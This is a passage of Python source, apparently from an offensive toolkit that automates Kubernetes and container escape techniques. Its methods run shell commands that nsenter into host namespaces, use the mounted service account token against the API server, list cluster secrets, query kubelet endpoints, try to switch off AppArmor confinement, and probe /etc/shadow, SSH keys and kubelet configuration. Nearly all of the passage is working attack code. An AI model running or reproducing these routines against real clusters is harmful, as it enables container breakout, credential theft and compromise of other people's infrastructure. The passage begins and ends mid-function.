            output_parts.append("[*] Attempting privileged command execution...")
            priv_exec = self.run_command(
                "nsenter -t 1 -m -u -i -n -p -- sh -c 'id; hostname' 2>/dev/null",
                timeout=15
            )
            output_parts.append(f"[+] Privileged exec:\n{priv_exec}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_hostpid_escape(self) -> str:
        """Kubernetes escape via hostPID sharing."""
        technique = "K8s HostPID Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking hostPID namespace...")
            ns_pid = self.run_command("readlink /proc/1/ns/pid 2>/dev/null")
            output_parts.append(f"[*] PID namespace: {ns_pid}")

            output_parts.append("[*] Listing visible processes...")
            processes = self.run_command(
                "ps aux 2>/dev/null | head -20 || ps -ef 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Process list:\n{processes}")

            output_parts.append("[*] Checking init process identity...")
            init_cmd = self.run_command("cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '")
            output_parts.append(f"[*] Init command: {init_cmd}")

            output_parts.append("[*] Attempting host PID namespace access...")
            host_pids = self.run_command(
                "ls /proc/ | grep -E '^[0-9]+$' | sort -n | head -30"
            )
            output_parts.append(f"[*] Available PIDs:\n{host_pids}")

            output_parts.append("[*] Reading host process cmdline...")
            for pid in ["1", "2", "100", "1000"]:
                cmdline = self.run_command(
                    f"cat /proc/{pid}/cmdline 2>/dev/null | tr '\\0' ' '"
                )
                if cmdline and "cat:" not in cmdline:
                    output_parts.append(f"[*] PID {pid}: {cmdline}")

            output_parts.append("[*] Attempting nsenter with host PID...")
            nsenter_result = self.run_command(
                "nsenter -t 1 -p -- sh -c 'ps aux | head -10' 2>/dev/null",
                timeout=15
            )
            output_parts.append(f"[+] Host PID nsenter:\n{nsenter_result}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_hostnetwork_escape(self) -> str:
        """Kubernetes escape via hostNetwork access."""
        technique = "K8s HostNetwork Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking host network namespace...")
            ns_net = self.run_command("readlink /proc/1/ns/net 2>/dev/null")
            output_parts.append(f"[*] Network namespace: {ns_net}")

            output_parts.append("[*] Checking network interfaces...")
            interfaces = self.run_command(
                "ip addr 2>/dev/null || ifconfig 2>/dev/null | head -30"
            )
            output_parts.append(f"[*] Interfaces:\n{interfaces}")

            output_parts.append("[*] Checking for kubelet API access...")
            kubelet_check = self.run_command(
                "curl -sk https://127.0.0.1:10250/healthz 2>/dev/null"
            )
            output_parts.append(f"[*] Kubelet health: {kubelet_check}")

            output_parts.append("[*] Checking for API server access...")
            api_check = self.run_command(
                "curl -sk https://kubernetes.default.svc:443/version 2>/dev/null"
            )
            output_parts.append(f"[*] API server: {api_check}")

            output_parts.append("[*] Checking for host network services...")
            host_ports = self.run_command(
                "netstat -tlnp 2>/dev/null | head -20 || ss -tlnp 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Host ports:\n{host_ports}")

            output_parts.append("[*] Checking for DNS resolution...")
            dns_check = self.run_command(
                "cat /etc/resolv.conf 2>/dev/null"
            )
            output_parts.append(f"[*] DNS config:\n{dns_check}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_hostipc_escape(self) -> str:
        """Kubernetes escape via hostIPC sharing."""
        technique = "K8s HostIPC Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking host IPC namespace...")
            ns_ipc = self.run_command("readlink /proc/1/ns/ipc 2>/dev/null")
            output_parts.append(f"[*] IPC namespace: {ns_ipc}")

            output_parts.append("[*] Checking System V IPC...")
            ipc_info = self.run_command(
                "ipcs 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] IPC info:\n{ipc_info}")

            output_parts.append("[*] Checking shared memory segments...")
            shm_info = self.run_command(
                "ipcs -m 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Shared memory:\n{shm_info}")

            output_parts.append("[*] Checking semaphores...")
            sem_info = self.run_command(
                "ipcs -s 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Semaphores:\n{sem_info}")

            output_parts.append("[*] Checking message queues...")
            msg_info = self.run_command(
                "ipcs -q 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Message queues:\n{msg_info}")

            output_parts.append("[*] Attempting to read host IPC data...")
            ipc_read = self.run_command(
                "cat /proc/1/ipc/shm 2>/dev/null || echo 'shm_not_accessible'"
            )
            output_parts.append(f"[*] IPC SHM read: {ipc_read}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_service_account_escape(self) -> str:
        """Kubernetes escape via service account token abuse."""
        technique = "K8s Service Account Token Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking for mounted service account token...")
            sa_token = self.run_command(
                "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -1"
            )
            if sa_token and len(sa_token) > 50:
                output_parts.append(f"[+] Service account token found (length: {len(sa_token)})")
            else:
                output_parts.append("[-] No service account token found")

            output_parts.append("[*] Checking service account namespace...")
            sa_ns = self.run_command(
                "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null"
            )
            output_parts.append(f"[*] Namespace: {sa_ns}")

            output_parts.append("[*] Checking service account CA cert...")
            sa_ca = self.run_command(
                "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | head -3"
            )
            output_parts.append(f"[*] CA cert present: {'yes' if sa_ca else 'no'}")

            if sa_token and len(sa_token) > 50:
                output_parts.append("[*] Testing API access with service account token...")
                api_test = self.run_command(
                    f'curl -sk -H "Authorization: Bearer {sa_token}" '
                    f'https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null | head -5',
                    timeout=15
                )
                output_parts.append(f"[*] API response:\n{api_test}")

                output_parts.append("[*] Checking API permissions...")
                json_body = (
                    '{"apiVersion":"authorization.k8s.io/v1",'
                    '"kind":"SelfSubjectAccessReview","spec":{'
                    '"resourceAttributes":{"resource":"pods","verb":"list"}}}'
                )
                perm_check = self.run_command(
                    f'curl -sk -H "Authorization: Bearer {sa_token}" '
                    f'https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreview '
                    f'--header "Content-Type: application/json" -d \'{json_body}\' 2>/dev/null',
                    timeout=15
                )
                output_parts.append(f"[*] Permission check:\n{perm_check}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_kubectl_exec_escape(self) -> str:
        """Kubernetes escape via kubectl exec to host."""
        technique = "K8s Kubectl Exec Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking kubectl availability...")
            kubectl_check = self.run_command("which kubectl 2>/dev/null || echo 'kubectl not found'")
            output_parts.append(f"[*] Kubectl: {kubectl_check}")

            output_parts.append("[*] Checking kubeconfig...")
            kubeconfig = self.run_command(
                "ls -la /etc/kubernetes/kubeconfig 2>/dev/null || "
                "ls -la ~/.kube/config 2>/dev/null || "
                "echo 'kubeconfig_not_found'"
            )
            output_parts.append(f"[*] Kubeconfig: {kubeconfig}")

            output_parts.append("[*] Checking for in-cluster kubectl access...")
            kubectl_cluster = self.run_command(
                "kubectl cluster-info 2>/dev/null || echo 'kubectl_cluster_failed'"
            )
            output_parts.append(f"[*] Cluster info: {kubectl_cluster}")

            output_parts.append("[*] Listing available pods...")
            pods = self.run_command(
                "kubectl get pods --all-namespaces 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Pods:\n{pods}")

            output_parts.append("[*] Checking for node exec capabilities...")
            node_exec = self.run_command(
                "kubectl get nodes 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Nodes: {node_exec}")

            output_parts.append("[*] Attempting kubectl exec to host...")
            exec_result = self.run_command(
                "kubectl exec --namespace kube-system $(kubectl get pods --namespace kube-system "
                "-l component=kube-controller-manager -o name 2>/dev/null | head -1) "
                "-- ls / 2>/dev/null | head -10",
                timeout=30
            )
            output_parts.append(f"[*] Kubectl exec: {exec_result}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_node_ssh_escape(self) -> str:
        """Kubernetes escape via node SSH access."""
        technique = "K8s Node SSH Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking SSH availability...")
            ssh_check = self.run_command("which ssh 2>/dev/null || echo 'ssh not found'")
            output_parts.append(f"[*] SSH client: {ssh_check}")

            output_parts.append("[*] Checking for SSH keys...")
            ssh_keys = self.run_command(
                "ls -la /root/.ssh/ 2>/dev/null || ls -la /home/*/.ssh/ 2>/dev/null || echo 'no_ssh_keys'"
            )
            output_parts.append(f"[*] SSH keys: {ssh_keys}")

            output_parts.append("[*] Checking for node IP...")
            node_ip = self.run_command(
                "curl -sk https://127.0.0.1:10250/hostname 2>/dev/null || "
                "echo $KUBERNETES_SERVICE_HOST 2>/dev/null"
            )
            output_parts.append(f"[*] Node IP: {node_ip}")

            output_parts.append("[*] Checking kubelet API for node info...")
            kubelet_info = self.run_command(
                "curl -sk https://127.0.0.1:10250/pods 2>/dev/null | head -100",
                timeout=15
            )
            output_parts.append(f"[*] Kubelet pods: {kubelet_info[:500]}")

            output_parts.append("[*] Checking for kubelet credentials...")
            kubelet_creds = self.run_command(
                "cat /var/lib/kubelet/config.yaml 2>/dev/null | head -20 || "
                "echo 'kubelet_config_not_found'"
            )
            output_parts.append(f"[*] Kubelet config:\n{kubelet_creds}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_api_server_escape(self) -> str:
        """Kubernetes escape via API server access."""
        technique = "K8s API Server Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking API server accessibility...")
            api_check = self.run_command(
                "curl -sk https://kubernetes.default.svc:443/version 2>/dev/null"
            )
            output_parts.append(f"[*] API version:\n{api_check}")

            output_parts.append("[*] Checking for anonymous auth...")
            anon_check = self.run_command(
                "curl -sk https://kubernetes.default.svc:443/api/v1/namespaces 2>/dev/null | head -5",
                timeout=15
            )
            output_parts.append(f"[*] Anonymous access:\n{anon_check}")

            output_parts.append("[*] Listing namespaces...")
            namespaces = self.run_command(
                "curl -sk https://kubernetes.default.svc:443/api/v1/namespaces 2>/dev/null | head -20",
                timeout=15
            )
            output_parts.append(f"[*] Namespaces:\n{namespaces}")

            output_parts.append("[*] Checking for RBAC bypass...")
            rbac_check = self.run_command(
                "curl -sk https://kubernetes.default.svc:443/apis/rbac.authorization.k8s.io/v1/clusterroles 2>/dev/null | head -10",
                timeout=15
            )
            output_parts.append(f"[*] Cluster roles:\n{rbac_check}")

            output_parts.append("[*] Checking for exposed secrets...")
            secrets = self.run_command(
                "curl -sk https://kubernetes.default.svc:443/api/v1/namespaces/default/secrets 2>/dev/null | head -20",
                timeout=15
            )
            output_parts.append(f"[*] Default secrets:\n{secrets}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_kubelet_escape(self) -> str:
        """Kubernetes escape via kubelet API access."""
        technique = "K8s Kubelet Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking kubelet API access...")
            kubelet_health = self.run_command(
                "curl -sk https://127.0.0.1:10250/healthz 2>/dev/null"
            )
            output_parts.append(f"[*] Kubelet health: {kubelet_health}")

            output_parts.append("[*] Checking kubelet endpoints...")
            kubelet_pods = self.run_command(
                "curl -sk https://127.0.0.1:10250/pods 2>/dev/null | head -100",
                timeout=15
            )
            output_parts.append(f"[*] Kubelet pods:\n{kubelet_pods[:500]}")

            output_parts.append("[*] Checking kubelet stats...")
            kubelet_stats = self.run_command(
                "curl -sk https://127.0.0.1:10250/stats/summary 2>/dev/null | head -50",
                timeout=15
            )
            output_parts.append(f"[*] Kubelet stats:\n{kubelet_stats[:500]}")

            output_parts.append("[*] Checking kubelet logs endpoint...")
            kubelet_logs = self.run_command(
                "curl -sk https://127.0.0.1:10250/containerLogs/default/pod-name/container 2>/dev/null | head -20",
                timeout=15
            )
            output_parts.append(f"[*] Kubelet logs: {kubelet_logs}")

            output_parts.append("[*] Checking kubelet exec endpoint...")
            kubelet_exec = self.run_command(
                "curl -sk https://127.0.0.1:10250/run/namespace/pod/container 2>/dev/null",
                timeout=15
            )
            output_parts.append(f"[*] Kubelet exec: {kubelet_exec}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_containerd_socket_escape(self) -> str:
        """Kubernetes escape via containerd socket."""
        technique = "K8s Containerd Socket Escape"
        try:
            output_parts = []

            output_parts.append("[*] Locating containerd socket...")
            sockets = self.run_command(
                "find /run /var/run -name 'containerd.sock' 2>/dev/null"
            )
            output_parts.append(f"[*] Sockets found:\n{sockets}")

            output_parts.append("[*] Checking containerd socket access...")
            socket_check = self.run_command(
                "ls -la /run/containerd/containerd.sock 2>/dev/null"
            )
            output_parts.append(f"[*] Socket access: {socket_check}")

            output_parts.append("[*] Listing containerd containers...")
            containers = self.run_command(
                "ctr -a /run/containerd/containerd.sock containers ls 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Containers:\n{containers}")

            output_parts.append("[*] Checking containerd namespaces...")
            namespaces = self.run_command(
                "ctr -a /run/containerd/containerd.sock namespace ls 2>/dev/null"
            )
            output_parts.append(f"[*] Namespaces:\n{namespaces}")

            output_parts.append("[*] Checking containerd images...")
            images = self.run_command(
                "ctr -a /run/containerd/containerd.sock images ls 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Images:\n{images}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_docker_socket_escape(self) -> str:
        """Kubernetes escape via Docker socket in pod."""
        technique = "K8s Docker Socket Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking for Docker socket mount...")
            docker_sock = self.run_command(
                "ls -la /var/run/docker.sock 2>/dev/null"
            )
            output_parts.append(f"[*] Docker socket: {docker_sock}")

            output_parts.append("[*] Testing Docker socket access...")
            docker_test = self.run_command(
                "docker version 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Docker access:\n{docker_test}")

            output_parts.append("[*] Listing Docker containers...")
            docker_containers = self.run_command(
                "docker ps 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Docker containers:\n{docker_containers}")

            output_parts.append("[*] Listing Docker images...")
            docker_images = self.run_command(
                "docker images 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Docker images:\n{docker_images}")

            output_parts.append("[*] Checking Docker daemon info...")
            docker_info = self.run_command(
                "docker info 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Docker info:\n{docker_info}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_volume_escape(self) -> str:
        """Kubernetes escape via volume misconfiguration."""
        technique = "K8s Volume Escape"
        try:
            output_parts = []

            output_parts.append("[*] Enumerating mounted volumes...")
            volumes = self.run_command(
                "mount | grep -v 'proc\\|sys\\|dev\\|cgroup' 2>/dev/null"
            )
            output_parts.append(f"[*] Mounted volumes:\n{volumes}")

            output_parts.append("[*] Checking for NFS mounts...")
            nfs_mounts = self.run_command(
                "mount | grep nfs 2>/dev/null || echo 'no_nfs'"
            )
            output_parts.append(f"[*] NFS mounts: {nfs_mounts}")

            output_parts.append("[*] Checking for Ceph/RBD mounts...")
            rbd_mounts = self.run_command(
                "mount | grep -E 'rbd|ceph' 2>/dev/null || echo 'no_ceph'"
            )
            output_parts.append(f"[*] Ceph mounts: {rbd_mounts}")

            output_parts.append("[*] Checking for ISCSI mounts...")
            iscsi_mounts = self.run_command(
                "mount | grep iscsi 2>/dev/null || echo 'no_iscsi'"
            )
            output_parts.append(f"[*] ISCSI mounts: {iscsi_mounts}")

            output_parts.append("[*] Checking for ConfigMap/Secret mounts...")
            cm_mounts = self.run_command(
                "ls -la /etc/config/ 2>/dev/null || ls -la /var/run/secrets/ 2>/dev/null"
            )
            output_parts.append(f"[*] Config mounts:\n{cm_mounts}")

            output_parts.append("[*] Attempting host access via volume mount...")
            host_access = self.run_command(
                "find / -maxdepth 3 -name 'shadow' -o -name 'passwd' 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Sensitive files found:\n{host_access}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_init_container_escape(self) -> str:
        """Kubernetes escape via init container abuse."""
        technique = "K8s Init Container Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking init container status...")
            init_status = self.run_command(
                "cat /etc/podinfo/labels 2>/dev/null || echo 'no_pod_info'"
            )
            output_parts.append(f"[*] Pod info: {init_status}")

            output_parts.append("[*] Checking for init container artifacts...")
            init_artifacts = self.run_command(
                "ls -la /var/lib/kubelet/pods/ 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Kubelet pods dir:\n{init_artifacts}")

            output_parts.append("[*] Checking for completed init containers...")
            init_containers = self.run_command(
                "cat /proc/1/status | grep -i name 2>/dev/null"
            )
            output_parts.append(f"[*] Process name: {init_containers}")

            output_parts.append("[*] Checking for volume mounts from init containers...")
            vol_mounts = self.run_command(
                "cat /proc/1/mountinfo 2>/dev/null | grep -v 'proc\\|sys\\|dev\\|cgroup' | head -20"
            )
            output_parts.append(f"[*] Volume mounts:\n{vol_mounts}")

            output_parts.append("[*] Checking for host PID access via init containers...")
            host_pid = self.run_command(
                "nsenter -t 1 -p -- ps aux 2>/dev/null | head -10",
                timeout=15
            )
            output_parts.append(f"[*] Host PID access: {host_pid}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def k8s_security_context_escape(self) -> str:
        """Kubernetes escape via security context misconfiguration."""
        technique = "K8s Security Context Escape"
        try:
            output_parts = []

            output_parts.append("[*] Analyzing security context...")
            security_context = self.run_command(
                "cat /proc/1/status | grep -i cap 2>/dev/null"
            )
            output_parts.append(f"[*] Security context:\n{security_context}")

            output_parts.append("[*] Checking for privilege escalation...")
            cap_eff = self.run_command(
                "grep CapEff /proc/1/status | awk '{print $2}'"
            )
            output_parts.append(f"[*] Effective capabilities: {cap_eff}")

            output_parts.append("[*] Checking SELinux status...")
            selinux = self.run_command(
                "getenforce 2>/dev/null || echo 'SELinux_not_available'"
            )
            output_parts.append(f"[*] SELinux: {selinux}")

            output_parts.append("[*] Checking AppArmor status...")
            apparmor = self.run_command(
                "cat /proc/1/attr/current 2>/dev/null || echo 'AppArmor_not_available'"
            )
            output_parts.append(f"[*] AppArmor: {apparmor}")

            output_parts.append("[*] Checking seccomp profile...")
            seccomp = self.run_command(
                "cat /proc/1/status | grep Seccomp 2>/dev/null"
            )
            output_parts.append(f"[*] Seccomp: {seccomp}")

            output_parts.append("[*] Checking for privilege escalation vectors...")
            privesc = self.run_command(
                "find / -perm -4000 -type f 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] SUID binaries:\n{privesc}")

            output_parts.append("[*] Checking for writable sensitive paths...")
            writable = self.run_command(
                "find /etc -writable -type f 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Writable /etc files:\n{writable}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    # =========================================================================
    # CONTAINER BREAKOUT METHODS (10)
    # =========================================================================

    def namespace_escape(self) -> str:
        """Generic container escape via namespace manipulation."""
        technique = "Namespace Escape"
        try:
            output_parts = []

            output_parts.append("[*] Enumerating namespaces...")
            namespaces = self.run_command(
                "ls -la /proc/1/ns/ 2>/dev/null"
            )
            output_parts.append(f"[*] Available namespaces:\n{namespaces}")

            output_parts.append("[*] Checking namespace isolation levels...")
            ns_info = self.run_command(
                "readlink /proc/1/ns/* 2>/dev/null"
            )
            output_parts.append(f"[*] Namespace links:\n{ns_info}")

            output_parts.append("[*] Attempting namespace escape via unshare...")
            unshare_result = self.run_command(
                "unshare --mount --propagation=slave /bin/sh -c 'echo unshare_success' 2>/dev/null || "
                "echo 'unshare_failed'"
            )
            output_parts.append(f"[*] Unshare result: {unshare_result}")

            output_parts.append("[*] Checking for namespace leaks...")
            ns_leak = self.run_command(
                "ls -la /proc/*/ns/ 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Namespace leaks:\n{ns_leak}")

            output_parts.append("[*] Attempting namespace escape via setns...")
            setns_result = self.run_command(
                "nsenter --all --target 1 -- sh -c 'echo setns_success; id' 2>/dev/null || "
                "echo 'setns_failed'"
            )
            output_parts.append(f"[*] Setns result: {setns_result}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def capabilities_escape(self) -> str:
        """Generic container escape via Linux capabilities abuse."""
        technique = "Capabilities Escape"
        try:
            output_parts = []

            output_parts.append("[*] Analyzing current capabilities...")
            caps = self.run_command(
                "cat /proc/1/status | grep Cap"
            )
            output_parts.append(f"[*] Capabilities:\n{caps}")

            output_parts.append("[*] Decoding capability bits...")
            cap_hex = self.run_command(
                "grep CapEff /proc/1/status | awk '{print $2}'"
            )
            output_parts.append(f"[*] CapEff hex: {cap_hex}")

            if cap_hex and cap_hex != "0000000000000000":
                output_parts.append("[+] Non-zero capabilities detected!")
                output_parts.append("[*] Checking for CAP_SYS_ADMIN...")
                if cap_hex and len(cap_hex) >= 16:
                    cap_val = int(cap_hex, 16)
                    if cap_val & (1 << 21):
                        output_parts.append("[+] CAP_SYS_ADMIN is present!")

                    output_parts.append("[*] Checking for CAP_NET_ADMIN...")
                    if cap_val & (1 << 12):
                        output_parts.append("[+] CAP_NET_ADMIN is present!")

                    output_parts.append("[*] Checking for CAP_NET_RAW...")
                    if cap_val & (1 << 13):
                        output_parts.append("[+] CAP_NET_RAW is present!")

            output_parts.append("[*] Testing capability-based escape...")
            cap_test = self.run_command(
                "mount -t tmpfs tmpfs /tmp/cap_test 2>/dev/null && echo 'cap_mount_works' || "
                "echo 'cap_mount_failed'"
            )
            output_parts.append(f"[*] Capability mount test: {cap_test}")

            output_parts.append("[*] Checking for capability inheritance...")
            inherit = self.run_command(
                "grep CapBnd /proc/1/status | awk '{print $2}'"
            )
            output_parts.append(f"[*] Bounding capabilities: {inherit}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def seccomp_bypass(self) -> str:
        """Generic container escape via seccomp profile bypass."""
        technique = "Seccomp Bypass"
        try:
            output_parts = []

            output_parts.append("[*] Checking seccomp status...")
            seccomp_status = self.run_command(
                "cat /proc/1/status | grep Seccomp"
            )
            output_parts.append(f"[*] Seccomp status: {seccomp_status}")

            output_parts.append("[*] Checking seccomp mode...")
            seccomp_mode = self.run_command(
                "cat /proc/self/status | grep Seccomp"
            )
            output_parts.append(f"[*] Self seccomp: {seccomp_mode}")

            output_parts.append("[*] Testing blocked syscalls...")
            blocked_syscalls = []
            test_syscalls = [
                ("mount", "mount -t tmpfs tmpfs /tmp/seccomp_test 2>/dev/null"),
                ("reboot", "reboot 2>/dev/null"),
                ("kexec_load", "kexec -l 2>/dev/null"),
                ("init_module", "init_module 2>/dev/null"),
                ("delete_module", "rmmod 2>/dev/null"),
            ]
            for name, cmd in test_syscalls:
                result = self.run_command(cmd)
                if "[ERROR]" in result or "Operation not permitted" in result:
                    blocked_syscalls.append(name)
                output_parts.append(f"[*] {name}: {'blocked' if name in blocked_syscalls else 'allowed'}")

            output_parts.append("[*] Checking seccomp filter count...")
            filter_count = self.run_command(
                "cat /proc/self/status | grep -c Seccomp 2>/dev/null"
            )
            output_parts.append(f"[*] Seccomp filters: {filter_count}")

            output_parts.append("[*] Attempting seccomp bypass via ptrace...")
            ptrace_bypass = self.run_command(
                "strace -e trace=none ls / 2>/dev/null && echo 'ptrace_works' || echo 'ptrace_blocked'",
                timeout=10
            )
            output_parts.append(f"[*] Ptrace bypass: {ptrace_bypass}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def apparmor_bypass(self) -> str:
        """Generic container escape via AppArmor bypass."""
        technique = "AppArmor Bypass"
        try:
            output_parts = []

            output_parts.append("[*] Checking AppArmor status...")
            apparmor_status = self.run_command(
                "cat /proc/1/attr/current 2>/dev/null || echo 'AppArmor_not_available'"
            )
            output_parts.append(f"[*] AppArmor profile: {apparmor_status}")

            output_parts.append("[*] Checking AppArmor enforcement...")
            enforcement = self.run_command(
                "cat /sys/module/apparmor/parameters/enabled 2>/dev/null || "
                "echo 'apparmor_not_loaded'"
            )
            output_parts.append(f"[*] Enforcement: {enforcement}")

            output_parts.append("[*] Checking for unconfined processes...")
            unconfined = self.run_command(
                "cat /proc/*/attr/current 2>/dev/null | grep unconfined | head -5"
            )
            output_parts.append(f"[*] Unconfined processes: {unconfined}")

            output_parts.append("[*] Testing AppArmor restrictions...")
            restricted_ops = []
            test_ops = [
                ("ptrace", "ptrace -p 1 2>/dev/null"),
                ("mount", "mount -t tmpfs tmpfs /tmp/apparmor_test 2>/dev/null"),
                ("ptrace_other", "cat /proc/1/mem 2>/dev/null"),
            ]
            for name, cmd in test_ops:
                result = self.run_command(cmd)
                if "denied" in result.lower() or "Operation not permitted" in result:
                    restricted_ops.append(name)
                output_parts.append(f"[*] {name}: {'restricted' if name in restricted_ops else 'allowed'}")

            output_parts.append("[*] Checking for AppArmor profile bypass...")
            profile_bypass = self.run_command(
                "echo 'unconfined' > /proc/self/attr/current 2>/dev/null && echo 'bypass_works' || "
                "echo 'bypass_failed'"
            )
            output_parts.append(f"[*] Profile bypass: {profile_bypass}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def selinux_bypass(self) -> str:
        """Generic container escape via SELinux bypass."""
        technique = "SELinux Bypass"
        try:
            output_parts = []

            output_parts.append("[*] Checking SELinux status...")
            selinux_status = self.run_command(
                "getenforce 2>/dev/null || echo 'SELinux_not_available'"
            )
            output_parts.append(f"[*] SELinux status: {selinux_status}")

            output_parts.append("[*] Checking SELinux context...")
            selinux_context = self.run_command(
                "ls -Z / 2>/dev/null | head -10 || echo 'context_not_available'"
            )
            output_parts.append(f"[*] SELinux context:\n{selinux_context}")

            output_parts.append("[*] Checking SELinux policy...")
            selinux_policy = self.run_command(
                "semanage boolean -l 2>/dev/null | head -10 || "
                "cat /etc/selinux/config 2>/dev/null"
            )
            output_parts.append(f"[*] SELinux policy:\n{selinux_policy}")

            output_parts.append("[*] Testing SELinux restrictions...")
            selinux_restrictions = []
            test_files = ["/etc/shadow", "/etc/passwd", "/root/.ssh/authorized_keys"]
            for f in test_files:
                check = self.run_command(f"test -r {f} && echo 'readable' || echo 'not_readable'")
                if "readable" in check:
                    selinux_restrictions.append(f)
                output_parts.append(f"[*] {f}: {check}")

            output_parts.append("[*] Checking for SELinux bypass via procfs...")
            procfs_bypass = self.run_command(
                "cat /proc/1/attr/current 2>/dev/null"
            )
            output_parts.append(f"[*] SELinux procfs: {procfs_bypass}")

            output_parts.append("[*] Checking SELinux booleans...")
            booleans = self.run_command(
                "getsebool -a 2>/dev/null | head -20 || echo 'getsebool_not_available'"
            )
            output_parts.append(f"[*] SELinux booleans:\n{booleans}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def user_namespace_escape(self) -> str:
        """Generic container escape via user namespace escape."""
        technique = "User Namespace Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking user namespace...")
            user_ns = self.run_command("readlink /proc/1/ns/user 2>/dev/null")
            output_parts.append(f"[*] User namespace: {user_ns}")

            output_parts.append("[*] Checking current UID/GID mappings...")
            uid_map = self.run_command("cat /proc/1/uid_map 2>/dev/null")
            output_parts.append(f"[*] UID map: {uid_map}")

            gid_map = self.run_command("cat /proc/1/gid_map 2>/dev/null")
            output_parts.append(f"[*] GID map: {gid_map}")

            output_parts.append("[*] Checking for user namespace creation capability...")
            unshare_test = self.run_command(
                "unshare -U id 2>/dev/null || echo 'user_namespace_not_allowed'"
            )
            output_parts.append(f"[*] User namespace unshare: {unshare_test}")

            output_parts.append("[*] Checking /proc/setgroups access...")
            setgroups = self.run_command(
